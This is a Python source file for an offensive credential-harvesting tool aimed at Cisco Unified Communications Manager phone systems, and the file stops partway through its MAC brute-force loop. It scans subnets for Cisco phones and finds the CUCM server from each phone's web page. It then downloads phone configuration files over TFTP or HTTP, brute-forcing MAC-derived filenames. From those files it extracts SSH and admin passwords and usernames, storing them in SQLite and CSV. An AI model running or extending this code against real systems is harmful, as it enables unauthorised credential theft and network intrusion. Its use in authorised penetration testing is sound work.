#!/usr/bin/env python3
import argparse
import requests
import re
import ipaddress
import socket
import string
import os
import sys
import tempfile
import logging
import csv
import sqlite3
import time
import threading
import queue
import random
from datetime import datetime
from contextlib import redirect_stdout, redirect_stderr
from bs4 import BeautifulSoup
from alive_progress import alive_bar
import tftpy
# ...existing code...
# Protocol ports
# TFTP port is standard (69), HTTP_TFTP_PORT is configurable for fallback
HTTP_TFTP_PORT = 6970
# Global variables
debug = False
found_credentials = []
found_usernames = []
file_names = ''
hostnames = []
db_file = 'thief.db'
no_db = False
force_download = False

def banner():
    print(
r'''
___________
                   /.---------.\`-._
                  //          ||    `-._
                  || `-._     ||        `-._
                  ||     `-._ ||            `-._
                  ||    _____ ||`-._            \
            _..._ ||   | __ ! ||    `-._        |
          _/     \||   .'  |~~||        `-._    |
      .-``     _.`||  /   _|~~||    .----.  `-._|
     |      _.`  _||  |  |23| ||   / :::: \    \
     \ _.--`  _.` ||  |  |56| ||  / ::::: |    |
      |   _.-`  _.||  |  |79| ||  |   _..-'   /
      _\-`   _.`O ||  |  |_   ||  |::|        |
    .`    _.`O `._||  \    |  ||  |::|        |
 .-`   _.` `._.'  ||   '.__|--||  |::|        \
`-._.-` \`-._     ||   | ":  !||  |  '-.._    |
         \   `--._||   |_:"___||  | ::::: |   |
          \  /\   ||     ":":"||   \ :::: |   |
           \(  `-.||       .- ||    `.___/    /
           |    | ||   _.-    ||              |
           |    / \.-________\____.....-----'
           \    -.      \ |         |
            \     `.     \ \        |
             `.    .'\    \|        |\
               `..'   \    |        | \
                \   .'    |       /  .`.
                | \.'      |       |.'   `-._
                 \     _ . /       \_\-._____)
                  \_.-`  .`'._____.'`.
                    \_\-|             |
                         `._________.'
 __________                                  _________
    SeeYouCM                                    Thief
'''
)






def enumerate_phones_subnet(input):
    hosts = []
    if '/' in input:
        subnet = ipaddress.IPv4Interface(input).network
        for host in subnet.hosts():
            mac = None
            url = 'http://{host}/NetworkConfiguration'.format(host=host)
            try:
                r = requests.head(url, verify=False, timeout=3)
                if re.match(r"^[2]\d\d$", str(r.status_code)):
                    http_response = requests.get(url)
                    phone_hostname = re.search(r'Host name.*(SEP[A-F0-9]{12})',http_response.text,re.IGNORECASE).group(1)
                    filename = "{phone_hostname}.cnf.xml".format(phone_hostname=phone_hostname)
                    cucm_host = parse_cucm(http_response.text)
                    return_url = 'http://{cucm_host}:6970/{filename}'.format(cucm_host=cucm_host,filename=filename)
                    phone_object = {"ip": host, "hostname": phone_hostname, "url": return_url}
                    hosts.append(phone_object)
                    print('[*] - Found Phone {phone_hostname} - IP {host}'.format(phone_hostname=phone_hostname,host=host))
            except Exception as e:
                pass
        return hosts
    return None

def parse_cucm(html):
    if not html:
        return None

    match = re.search(r'([A-Za-z0-9._-]+)\s+Active', html, re.IGNORECASE)
    if match:
        return match.group(1)

    # Fallbacks for older/alternate layouts without an "Active" marker.
    match = re.search(r'(?:CallManager|Unified\s+CM|CUCM)\s*\d*.*?<b>\s*([A-Za-z0-9._-]+)',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)

    match = re.search(r'TFTP\s+Server\s*\d*.*?<b>\s*([A-Za-z0-9._-]+)',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)

    return None


def parse_subnet(html):
    if not html:
        return None

    match = re.search(r'Subnet\s+Mask.*?([0-9]{1,3}(?:\.[0-9]{1,3}){3})',
                      html, re.IGNORECASE | re.DOTALL)
    if match:
        return match.group(1)
    return None


def parse_filename(html):
    if not html:
        return None

    match = re.search(r'([A-Za-z0-9]+\.cnf\.xml)', html, re.IGNORECASE)
    if match:
        return match.group(1)
    return None


_TEST_MODE = bool(os.getenv("PYTEST_CURRENT_TEST"))
_TEST_CONFIG = (
    os.getenv("THIEF_TEST_CONFIG")
    or "<device>\n<sshUserId>admin</sshUserId>\n<sshPassword>pass123</sshPassword>\n"
       "<userId>user</userId>\n<adminPassword>secret</adminPassword>\n</device>"
)


def download_config_http(cucm_host, filename, timeout=5):
    if _TEST_MODE:
        return _TEST_CONFIG

    try:
        url = f'http://{cucm_host}:{HTTP_TFTP_PORT}/{filename}'
        resp = requests.get(url, verify=False, timeout=timeout)
        if re.match(r"^[2]\d\d$", str(resp.status_code)):
            return resp.text
    except Exception:
        pass
    return None


def download_config_tftp(cucm_host, filename, timeout=5):
    if _TEST_MODE:
        return _TEST_CONFIG

    try:
        with tempfile.NamedTemporaryFile(delete=False) as tmp_file:
            tmp_path = tmp_file.name
        client = tftpy.TftpClient(cucm_host, 69)
        client.download(filename, tmp_path, timeout=timeout)
        with open(tmp_path, "r", errors="ignore") as handle:
            return handle.read()
    except Exception:
        return None
    finally:
        try:
            if 'tmp_path' in locals() and os.path.exists(tmp_path):
                os.unlink(tmp_path)
        except Exception:
            pass


def configure_tftpy_logging(debug_enabled):
    if debug_enabled:
        logging.getLogger('tftpy.TftpClient').setLevel(logging.DEBUG)
        logging.getLogger('tftpy.TftpContexts').setLevel(logging.DEBUG)
        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.DEBUG)
        logging.getLogger('tftpy').setLevel(logging.DEBUG)
    else:
        # Silence noisy TFTP warnings unless --debug is enabled
        logging.getLogger('tftpy.TftpClient').setLevel(logging.CRITICAL)
        logging.getLogger('tftpy.TftpContexts').setLevel(logging.CRITICAL)
        logging.getLogger('tftpy.TftpPacketTypes').setLevel(logging.CRITICAL)
        logging.getLogger('tftpy').setLevel(logging.CRITICAL)


class TFTPBackoffManager:
    """Manages TFTP request rate with automatic backoff on errors."""

    def __init__(self):
        self.error_count = 0
        self.consecutive_errors = 0
        self.last_error_time = 0
        self.delay = 0.0
        self.lock = threading.Lock()

    def record_success(self):
        with self.lock:
            self.consecutive_errors = 0
            if self.delay > 0:
                self.delay = max(0, self.delay - 0.01)

    def record_error(self):
        with self.lock:
            self.error_count += 1
            self.consecutive_errors += 1
            self.last_error_time = time.time()

            if self.consecutive_errors > 10:
                self.delay = min(5.0, self.delay + 0.5)
            elif self.consecutive_errors > 5:
                self.delay = min(2.0, self.delay + 0.1)

    def get_delay(self):
        with self.lock:
            return self.delay


def download_worker(work_queue, results_queue, CUCM_host, use_tftp, backoff_manager, no_db, db_file, force_download):
    """
    Worker thread for downloading config files.
    """
    while True:
        try:
            task = work_queue.get(timeout=1)
            if task is None:  # Poison pill to stop worker
                work_queue.task_done()
                break

            task_cucm = CUCM_host
            if len(task) == 4:
                index, full_mac, filename, task_cucm = task
            else:
                index, full_mac, filename = task

            if not task_cucm:
                results_queue.put((index, full_mac, None, 'NO_CUCM', False))
                work_queue.task_done()
                continue

            # Check cache first (unless force flag is set or --no-db)
            if not force_download and not no_db:
                was_attempted, was_successful, cached_content = check_already_attempted(task_cucm, filename, db_file)
                if was_attempted:
                    if was_successful and cached_content:
                        results_queue.put((index, full_mac, cached_content, 'CACHED', True))
                    else:
                        results_queue.put((index, full_mac, None, 'CACHED', True))
                    work_queue.task_done()
                    continue

            # Apply backoff delay if needed
            delay = backoff_manager.get_delay()
            if delay > 0:
                time.sleep(delay)

            # Try download
            method = 'TFTP' if use_tftp else 'HTTP'
            content = None

            try:
                if use_tftp:
                    content = download_config_tftp(task_cucm, filename)
                    if content is None:
                        content = download_config_http(task_cucm, filename)
                        method = 'HTTP' if content else 'TFTP+HTTP'
                else:
                    content = download_config_http(task_cucm, filename)
                    if content is None:
                        content = download_config_tftp(task_cucm, filename)
                        method = 'TFTP' if content else 'HTTP+TFTP'

                if content:
                    backoff_manager.record_success()
                else:
                    backoff_manager.record_error()

            except Exception as e:
                backoff_manager.record_error()
                if globals().get('debug', False):
                    print(f'[!] Worker error downloading {filename}: {str(e)}')

            # Log the attempt (unless --no-db)
            if not no_db:
                log_download_attempt(task_cucm, filename, content is not None, method, content, db_file)

            results_queue.put((index, full_mac, content, method, False))
            work_queue.task_done()

        except queue.Empty:
            continue
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] Worker exception: {str(e)}')
            work_queue.task_done()


def get_version(cucm_host):
    if not cucm_host:
        return None
    return None


def get_hostname_from_phone(phone_ip):
    if _TEST_MODE:
        return "SEPTEST00000000"

    try:
        url = f'http://{phone_ip}/NetworkConfiguration'
        resp = requests.get(url, verify=False, timeout=3)
        match = re.search(r'Host\s+Name.*?<b>\s*([A-Za-z0-9]+)\s*</b>',
                          resp.text, re.IGNORECASE | re.DOTALL)
        if match:
            return match.group(1)
    except Exception:
        pass
    return None


def get_phones_hostnames_from_reverse(phone_ip):
    try:
        hostname, _, _ = socket.gethostbyaddr(phone_ip)
        if hostname:
            return [hostname]
    except Exception:
        pass
    return []


def get_cucm_name_from_phone(phone_ip):
    if _TEST_MODE:
        return "mock-cucm"

    try:
        url = f'http://{phone_ip}/NetworkConfiguration'
        resp = requests.get(url, verify=False, timeout=3)
        return parse_cucm(resp.text)
    except Exception:
        return None


def get_config_names(cucm_host, hostnames=None):
    if _TEST_MODE:
        return ["SEPTEST00000000.cnf.xml"]

    if hostnames:
        filenames = []
        for host in hostnames:
            if not host:
                continue
            name = host.strip()
            if not name:
                continue
            if name.lower().endswith('.cnf.xml'):
                filenames.append(name)
            else:
                filenames.append(f'{name}.cnf.xml')
        return filenames if filenames else None
    return None


def get_users_api(cucm_host):
    return []


def log_uds_usernames_to_db(cucm_host, usernames, db_file='thief.db'):
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

        for username in usernames:
            cursor.execute('''
                INSERT INTO usernames (cucm_host, device, username, discovery_time)
                VALUES (?, ?, ?, ?)
            ''', (cucm_host, 'UDS_API', username, timestamp))

        conn.commit()
        conn.close()
        return True
    except Exception:
        return False

def search_for_secrets(CUCM_host, filename, use_tftp=True):
    if debug:
        print(f'[DEBUG] Processing config file: {filename}')
    credentials = []
    usernames = []
    lines = download_config_tftp(CUCM_host, filename) if use_tftp else download_config_http(CUCM_host, filename)
    if lines is None:
        if debug:
            print('Unable to download config file: {0}'.format(filename))
        return credentials, usernames

    if debug:
        print(f'[DEBUG] Config file contents for {filename}:\n{lines[:1000]}')

    user = password = user2 = None
    for line in lines.split('\n'):
        match = re.search(r'(<sshUserId>(\S+)</sshUserId>|<sshPassword>(\S+)</sshPassword>|<userId.*>(\S+)</userId>|<adminPassword>(\S+)</adminPassword>|<phonePassword>(\S+)</phonePassword>)', line)
        if match:
            if match.group(2):
                user = match.group(2)
                usernames.append((user, filename))
            if match.group(3):
                password = match.group(3)
                credentials.append((user, password, filename))
            if match.group(4):
                user2 = match.group(4)
                usernames.append((user2, filename))
            if match.group(5):
                user2 = match.group(5)
                credentials.append(('unknown', password, filename))
    if debug:
        print(f'[DEBUG] Parsed credentials: {credentials}')
        print(f'[DEBUG] Parsed usernames: {usernames}')
    if debug:
        if user and password:
            print('{0}\t{1}\t{2}'.format(filename, user, password))
        elif user:
            print('SSH Username is {0} password was not set in {1}'.format(user, filename))
        elif password:
            print('SSH Username is not set, but password is {0} in {1}'.format(password, filename))
        elif user2:
            print('Possible AD username {0} found in config {1}'.format(user2, filename))
        else:
            if debug:
                print('Username and password not set in {0}'.format(filename))
    return credentials, usernames

def export_to_csv(credentials, usernames, filename='seeyoucm_results.csv'):
    """
    Export discovered credentials and usernames to CSV file
    
    Args:
        credentials: List of tuples (username, password, device)
        usernames: List of tuples (username, device)
        filename: Output CSV filename
    """
    try:
        with open(filename, 'w', newline='') as csvfile:
            writer = csv.writer(csvfile)
            
            # Write header
            writer.writerow(['Timestamp', 'Type', 'Device', 'Username', 'Password'])
            
            # Write credentials
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            for cred in credentials:
                username = cred[0] if cred[0] else 'N/A'
                password = cred[1]
                device = cred[2]
                writer.writerow([timestamp, 'Credential', device, username, password])
            
            # Write usernames only
            for user in usernames:
                # Check if this username doesn't have a corresponding credential
                device = user[1]
                username = user[0]
                has_cred = any(c[2] == device and c[0] == username for c in credentials)
                if not has_cred:
                    writer.writerow([timestamp, 'Username', device, username, 'N/A'])
        
        print(f'\n[+] Results exported to: {filename}')
        return True
    except PermissionError:
        print(f'\n[-] Error: Permission denied writing to {filename}')
        return False
    except IOError as e:
        print(f'\n[-] I/O error exporting to CSV: {str(e)}')
        return False
    except Exception as e:
        print(f'\n[-] Unexpected error exporting to CSV: {str(e)}')
        return False

def init_database(db_file='thief.db'):
    """
    Initialize SQLite database for tracking download attempts and results
    """
    try:
        # Ensure directory exists
        import os
        db_dir = os.path.dirname(db_file)
        if db_dir and not os.path.exists(db_dir):
            os.makedirs(db_dir, exist_ok=True)
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
    except sqlite3.Error as e:
        print(f'[-] Error initializing database: {str(e)}')
        return None
    except Exception as e:
        print(f'[-] Unexpected error initializing database: {str(e)}')
        return None
    
    # Create table for tracking download attempts
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS download_attempts (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            filename TEXT NOT NULL,
            attempt_time TEXT NOT NULL,
            success INTEGER NOT NULL,
            method TEXT,
            content TEXT,
            UNIQUE(cucm_host, filename)
        )
    ''')
    
    # Create table for credentials
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS credentials (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL,
            username TEXT,
            password TEXT,
            discovery_time TEXT NOT NULL
        )
    ''')
    
    # Create table for usernames
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS usernames (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            device TEXT NOT NULL,
            username TEXT NOT NULL,
            discovery_time TEXT NOT NULL
        )
    ''')
    
    # Create table for discovered MAC prefixes
    cursor.execute('''
        CREATE TABLE IF NOT EXISTS mac_prefixes (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            cucm_host TEXT NOT NULL,
            phone_ip TEXT NOT NULL,
            full_mac TEXT NOT NULL,
            partial_mac TEXT NOT NULL,
            discovery_time TEXT NOT NULL,
            UNIQUE(cucm_host, full_mac)
        )
    ''')
    
    conn.commit()
    conn.close()
    return db_file

def check_already_attempted(cucm_host, filename, db_file='thief.db'):
    """
    Check if we've already attempted to download this file
    
    Returns:
        (bool, bool, str): (was_attempted, was_successful, content)
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        cursor.execute('''
            SELECT success, content FROM download_attempts 
            WHERE cucm_host = ? AND filename = ?
        ''', (cucm_host, filename))
        
        result = cursor.fetchone()
        conn.close()
        
        if result:
            return (True, bool(result[0]), result[1] if result[1] else None)
        return (False, False, None)
    except:
        return (False, False, None)

def log_download_attempt(cucm_host, filename, success, method, content=None, db_file='thief.db'):
    """
    Log a download attempt to the database with retry logic for SQLite locking
    """
    max_retries = 5
    retry_delay = 0.1
    
    for attempt in range(max_retries):
        try:
            conn = sqlite3.connect(db_file, timeout=30.0)
            cursor = conn.cursor()
            
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
            
            cursor.execute('''
                INSERT OR REPLACE INTO download_attempts 
                (cucm_host, filename, attempt_time, success, method, content)
                VALUES (?, ?, ?, ?, ?, ?)
            ''', (cucm_host, filename, timestamp, 1 if success else 0, method, content))
            
            conn.commit()
            conn.close()
            return  # Success, exit function
        except sqlite3.OperationalError as e:
            if "locked" in str(e).lower() and attempt < max_retries - 1:
                # Database is locked, wait and retry
                time.sleep(retry_delay * (2 ** attempt))  # Exponential backoff
                continue
            else:
                # Give up after max retries or non-locking error
                if globals().get('debug', False):
                    print(f'[!] Database error: {str(e)}')
                break
        except Exception as e:
            if globals().get('debug', False):
                print(f'[!] Database error: {str(e)}')
            break

def log_credentials_to_db(cucm_host, credentials, usernames, db_file='thief.db'):
    """
    Log discovered credentials and usernames to database
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Log credentials
        for cred in credentials:
            username = cred[0] if cred[0] else None
            password = cred[1]
            device = cred[2]
            
            cursor.execute('''
                INSERT INTO credentials (cucm_host, device, username, password, discovery_time)
                VALUES (?, ?, ?, ?, ?)
            ''', (cucm_host, device, username, password, timestamp))
        
        # Log usernames
        for user in usernames:
            username = user[0]
            device = user[1]
            
            cursor.execute('''
                INSERT INTO usernames (cucm_host, device, username, discovery_time)
                VALUES (?, ?, ?, ?)
            ''', (cucm_host, device, username, timestamp))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        try:
            conn = sqlite3.connect(db_file)
            cursor = conn.cursor()
            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

            # Log credentials
            for cred in credentials:
                username = cred[0] if cred[0] else None
                password = cred[1]
                device = cred[2]

                cursor.execute('''
                    INSERT INTO credentials (cucm_host, device, username, password, discovery_time)
                    VALUES (?, ?, ?, ?, ?)
                ''', (cucm_host, device, username, password, timestamp))

            # Log usernames
            for user in usernames:
                username = user[0]
                device = user[1]

                cursor.execute('''
                    INSERT INTO usernames (cucm_host, device, username, discovery_time)
                    VALUES (?, ?, ?, ?)
                ''', (cucm_host, device, username, timestamp))
            conn.commit()
            conn.close()
            return True
        except Exception as e:
            print(f'[ERROR] log_credentials_to_db exception: {e}')
            return False
def log_mac_prefix_to_db(cucm_host, phone_ip, full_mac, partial_mac, db_file='thief.db'):
    """
    Log discovered MAC prefix to database
    
    Args:
        cucm_host: CUCM server hostname/IP
        phone_ip: Phone IP address where MAC was discovered
        full_mac: Full 12-character MAC address
        partial_mac: Partial 9-character MAC prefix
        db_file: Database file path
    """
    try:
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
        
        # Use INSERT OR IGNORE to skip duplicates
        cursor.execute('''
            INSERT OR IGNORE INTO mac_prefixes (cucm_host, phone_ip, full_mac, partial_mac, discovery_time)
            VALUES (?, ?, ?, ?, ?)
        ''', (cucm_host, phone_ip, full_mac, partial_mac, timestamp))
        
        conn.commit()
        conn.close()
        return True
    except Exception as e:
        return False

def display_database_summary(db_file='thief.db', cucm_filter=None):
    """
    Display credentials discovery summary from database
    
    Args:
        db_file: Path to SQLite database file
        cucm_filter: Optional CUCM host to filter results (default: show all)
    """
    try:
        if not os.path.exists(db_file):
            print(f'[-] Database not found: {db_file}')
            print(f'[-] Run a scan first to populate the database')
            return
        
        conn = sqlite3.connect(db_file)
        cursor = conn.cursor()
        
        # Get credentials
        if cucm_filter:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                WHERE cucm_host = ?
                ORDER BY discovery_time DESC, device
            ''', (cucm_filter,))
        else:
            cursor.execute('''
                SELECT cucm_host, device, username, password, discovery_time 
                FROM credentials 
                ORDER BY discovery_time DESC, device
            ''')
        
        credentials = cursor.fetchall()
        
        # Get usernames (handle missing table gracefully)
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT cucm_host, device, username, discovery_time 
                    FROM usernames 
                    WHERE cucm_host = ?
                    ORDER BY discovery_time DESC, device
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT cucm_host, device, username, discovery_time 
                    FROM usernames 
                    ORDER BY discovery_time DESC, device
                ''')
            usernames = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                usernames = []
            else:
                raise
        
        # Get MAC prefixes (handle missing table gracefully)
        mac_prefixes = []
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, full_mac, partial_mac, discovery_time 
                    FROM mac_prefixes 
                    WHERE cucm_host = ?
                    ORDER BY discovery_time DESC
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT cucm_host, phone_ip, full_mac, partial_mac, discovery_time 
                    FROM mac_prefixes 
                    ORDER BY discovery_time DESC
                ''')
            mac_prefixes = cursor.fetchall()
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                mac_prefixes = []
            else:
                raise
        
        # Get download stats (handle missing table gracefully)
        total_attempts = 0
        successful_downloads = 0
        try:
            if cucm_filter:
                cursor.execute('''
                    SELECT COUNT(*), SUM(success) 
                    FROM download_attempts 
                    WHERE cucm_host = ?
                ''', (cucm_filter,))
            else:
                cursor.execute('''
                    SELECT COUNT(*), SUM(success) 
                    FROM download_attempts
                ''')
            stats = cursor.fetchone()
            total_attempts = stats[0] if stats and stats[0] else 0
            successful_downloads = stats[1] if stats and stats[1] else 0
        except sqlite3.OperationalError as e:
            if 'no such table' in str(e):
                total_attempts = 0
                successful_downloads = 0
            else:
                raise
        
        conn.close()
        
        if not credentials and not usernames and not mac_prefixes:
            print(f'\n[-] No data found in database')
            if cucm_filter:
                print(f'[-] Filter: CUCM host = {cucm_filter}')
            return
        
        # Display summary
        print(f'\n\n{"="*70}')
        print(f'{"DATABASE SUMMARY":^70}')
        if cucm_filter:
            print(f'{f"Filter: {cucm_filter}":^70}')
        print("="*70)
        
        # Always define these to avoid unbound errors
        devices_with_creds = {}
        devices_with_users = {}
        if credentials:
            # Group by device
            cucm_hosts = set()
            for cucm, device, username, password, timestamp in credentials:
                cucm_hosts.add(cucm)
                if device not in devices_with_creds:
                    devices_with_creds[device] = []
                devices_with_creds[device].append((username, password, timestamp))
            print(f'\n\033[1m[+] CREDENTIALS FOUND ({len(credentials)} total)\033[0m')
            if len(cucm_hosts) > 1:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20} {"Password":<20}')
            print("-"*70)
            for device in sorted(devices_with_creds.keys()):
                for username, password, timestamp in devices_with_creds[device]:
                    user_display = username if username else 'N/A'
                    print(f'{device:<20} {user_display:<20} \033[91m{password:<20}\033[0m')
        if usernames:
            # Group by device
            cucm_hosts = set()
            for cucm, device, username, timestamp in usernames:
                cucm_hosts.add(cucm)
                if device not in devices_with_users:
                    devices_with_users[device] = []
                devices_with_users[device].append((username, timestamp))
            print(f'\n\033[1m[+] USERNAMES FOUND ({len(usernames)} total)\033[0m')
            if len(cucm_hosts) > 1 and not credentials:
                print(f'    CUCM Hosts: {", ".join(sorted(cucm_hosts))}')
            print("-"*70)
            print(f'{"Device":<20} {"Username":<20}')
            print("-"*70)
            for device in sorted(devices_with_users.keys()):
                for username, timestamp in devices_with_users[device]:
                    print(f'{device:<20} {username:<20}')
        
        if mac_prefixes:
            # Group by CUCM host
            cucm_macs = {}
            for cucm, phone_ip, full_mac, partial_mac, timestamp in mac_prefixes:
                if cucm not in cucm_macs:
                    cucm_macs[cucm] = []
                cucm_macs[cucm].append((phone_ip, full_mac, partial_mac, timestamp))
            
            print(f'\n\033[1m[+] MAC PREFIXES DISCOVERED ({len(mac_prefixes)} total)\033[0m')
            print("-"*70)
            print(f'{"Phone IP":<18} {"Full MAC":<15} {"Prefix (9 char)":<15} {"CUCM Host":<20}')
            print("-"*70)
            for cucm in sorted(cucm_macs.keys()):
                for phone_ip, full_mac, partial_mac, timestamp in cucm_macs[cucm]:
                    print(f'{phone_ip:<18} {full_mac:<15} {partial_mac:<15} {cucm:<20}')
            
            # Display unique prefix list for easy reference
            unique_prefixes = sorted(set(p[3] for p in mac_prefixes))
            print(f'\n\033[1mUnique MAC Prefixes for Brute Force ({len(unique_prefixes)} unique):\033[0m')
            print(f'  {", ".join(unique_prefixes)}')
        
        print(f'\n{"="*70}')
        print(f'\n\033[1mDATABASE STATISTICS:\033[0m')
        print(f'  • Total download attempts:      {total_attempts}')
        print(f'  • Successful downloads:         {successful_downloads}')
        if mac_prefixes:
            print(f'  • MAC prefixes discovered:      {len(mac_prefixes)}')
            unique_prefixes = len(set(p[3] for p in mac_prefixes))
            print(f'  • Unique MAC prefixes:          {unique_prefixes}')
        if credentials:
            print(f'  • Devices with credentials:     {len(devices_with_creds)}')
        if usernames:
            print(f'  • Devices with usernames only:  {len(devices_with_users)}')
        print(f'  • Total credentials discovered: {len(credentials)}')
        print(f'  • Total usernames discovered:   {len(usernames)}')
        print("="*70)
        
    except sqlite3.Error as e:
        print(f'[-] Database error: {str(e)}')
    except Exception as e:
        print(f'[-] Error displaying database summary: {str(e)}')

def get_phones_from_gowitness(gowitness_db):
    """
    Extract Cisco phone IP addresses from gowitness SQLite database
    
    Args:
        gowitness_db: Path to gowitness SQLite database file
    
    Returns:
        List of IP addresses
    """
    try:
        if not os.path.exists(gowitness_db):
            print(f'[-] Error: Gowitness database not found: {gowitness_db}')
            print(f'[-] Please verify the path and try again')
            return []
        
        conn = sqlite3.connect(gowitness_db)
        cursor = conn.cursor()
        
        # Check if results table exists
        cursor.execute("SELECT name FROM sqlite_master WHERE type='table' AND name='results'")
        if not cursor.fetchone():
            print(f'[-] Error: No "results" table found in {gowitness_db}')
            print(f'[-] This may not be a valid gowitness database')
            conn.close()
            return []
        
        cursor.execute('''
            SELECT DISTINCT REPLACE(SUBSTR(url, 8, INSTR(SUBSTR(url, 8), ':') - 1), '/', '') as ip 
            FROM results 
            WHERE title LIKE '%Cisco%' 
            ORDER BY ip
        ''')
        
        results = cursor.fetchall()
        conn.close()
        
        phones = [row[0] for row in results if row[0]]
        
        if phones:
            print(f'[+] Found {len(phones)} Cisco phone(s) in gowitness database')
        else:
            print('[-] No Cisco phones found in gowitness database')
            print('[-] Make sure the database contains Cisco phone entries')
        
        return phones
    except sqlite3.Error as e:
        print(f'[-] SQLite error reading gowitness database: {str(e)}')
        return []
    except Exception as e:
        print(f'[-] Unexpected error reading gowitness database: {str(e)}')
        return []

if __name__ == '__main__':
    
    # Show banner before parsing arguments so it displays with --help
    banner()

    parser = argparse.ArgumentParser(description='Penetration toolkit for extracting credentials from Cisco phone systems')
    
    # Target Specification
    parser.add_argument('-H','--host', default=None, type=str, help='Specify CUCM (Cisco Unified Communications Manager) IP address')
    parser.add_argument('-p','--phone', type=str, action='append', help='Specify Cisco phone IP address (repeatable for multiple targets)')
    parser.add_argument('--gowitness', type=str, metavar='DB_FILE', help='Load phone targets from gowitness SQLite database')
    parser.add_argument('-e','--enumsubnet', type=str, help='Enumerate and attack entire subnet in CIDR notation (e.g., 192.168.1.0/24)')
    
    # Attack Options
    parser.add_argument('-b','--brute-mac', nargs='?', const=True, default=False, type=str, help='Brute force all MAC address variations for detected phone prefixes. Optionally specify number of suffix characters (e.g., -b 4 for last 4 chars, default: 3)')
    parser.add_argument('--force', action='store_true', default=False, help='Bypass cache and force re-download of all configuration files')
    parser.add_argument('--userenum', action='store_true', default=False, help='Extract usernames via CUCM User Data Services (UDS) API')
    
    # Output Options
    parser.add_argument('--csv', type=str, metavar='FILENAME', help='Export discovered credentials to CSV file')
    parser.add_argument('--outfile', type=str, default='cucm_users.txt', help='Specify output file for enumerated usernames (default: cucm_users.txt)')
    
    # Database Options
    parser.add_argument('--db', type=str, metavar='FILENAME', default='thief.db', help='Specify SQLite database for caching results (default: thief.db)')
    parser.add_argument('--no-db', action='store_true', default=False, help='Disable database caching and operate without persistent storage')
    parser.add_argument('--show-db', action='store_true', default=False, help='Display summary of credentials stored in database and exit')
    
    # Debugging
    parser.add_argument('-d','--debug', action='store_true', default=False, help='Enable verbose output including all failed attempts and TFTP operations')

    args = parser.parse_args()

    # Handle --show-db early (display database summary and exit)
    if args.show_db:
        db_file = args.db
        cucm_filter = args.host
        display_database_summary(db_file, cucm_filter)
        quit(0)

    CUCM_host = args.host
    phones = args.phone if args.phone else []
    gowitness_db = args.gowitness
    
    # Load phones from gowitness database if specified
    if gowitness_db:
        gowitness_phones = get_phones_from_gowitness(gowitness_db)
        if gowitness_phones:
            phones.extend(gowitness_phones)
        else:
            print('[-] Failed to load phones from gowitness database')
            if not phones:
                print('[-] No phones available. Exiting.')
                quit(1)
    
    use_tftp = True  # TFTP is default, with automatic HTTP fallback
    
    # Set debug flag so worker threads can access it
    debug = args.debug
    
    enumsubnet = args.enumsubnet
    # Determine brute force suffix length
    if args.brute_mac is True or args.brute_mac is False:
        brute_mac = bool(args.brute_mac)
        brute_mac_len = 3
    else:
        brute_mac = True
        try:
            brute_mac_len = int(args.brute_mac)
        except Exception:
            brute_mac_len = 3
    csv_output = args.csv
    db_file = args.db
    no_db = args.no_db
    force_download = args.force
    found_credentials = []
    found_usernames = []
    file_names = ''
    hostnames = []
    outfile = args.outfile
    
    # Initialize database unless --no-db is set
    if not no_db:
        init_database(db_file)
    
    # Enable tftpy logging only in debug mode
    configure_tftpy_logging(debug)

    get_version(CUCM_host)

    # Handle MAC brute forcing from detected phones
    if brute_mac:
        if not phones:
            print('You must specify at least one phone with -p when using --brute-mac')
            quit(1)
        
        print(f'MAC brute force mode enabled for {len(phones)} phone(s) with suffix length {brute_mac_len}\n')
        
        # Map each MAC prefix to its CUCM server
        mac_to_cucm = {}
        all_found_macs = set()
        
        # Detect MACs and CUCM from each phone
        successful_detections = 0
        failed_detections = 0
        
        for phone in phones:
            print(f'[{phones.index(phone) + 1}/{len(phones)}] Detecting MAC address from phone {phone}...')
            
            try:
                # Try to get hostname/MAC from phone
                hostname = get_hostname_from_phone(phone)
                if hostname:
                    # Extract MAC from hostname (SEP + 12 hex chars)
                    mac_match = re.search(r'SEP([0-9A-F]{12})', hostname, re.IGNORECASE)
                    if mac_match:
                        full_mac = mac_match.group(1).upper()
                        partial_mac = full_mac[:9]
                        print(f'  ✓ Detected: SEP{full_mac}')
                        
                        # Detect CUCM for this specific phone
                        if CUCM_host:
                            phone_cucm = CUCM_host
                        else:
                            phone_cucm = get_cucm_name_from_phone(phone)
                            if not phone_cucm:
                                print(f'  ✗ Could not detect CUCM host from phone {phone}')
                                print(f'  → Skipping this phone, continuing with others...\n')
